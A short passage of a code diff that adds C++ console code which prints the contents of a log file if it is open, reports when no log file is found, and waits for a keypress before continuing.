+        if (logFile.is_open()) {
+            string line;
+            while (getline(logFile, line)) {
+                cout << line << endl;
+            }
+            logFile.close();
+        } else {
+            cout << "No log file found." << endl;
+        }
+        
+    } else {
+        return;
+    }
+
+    cout << endl << "Press any key to continue...";
+    _getch();
 }
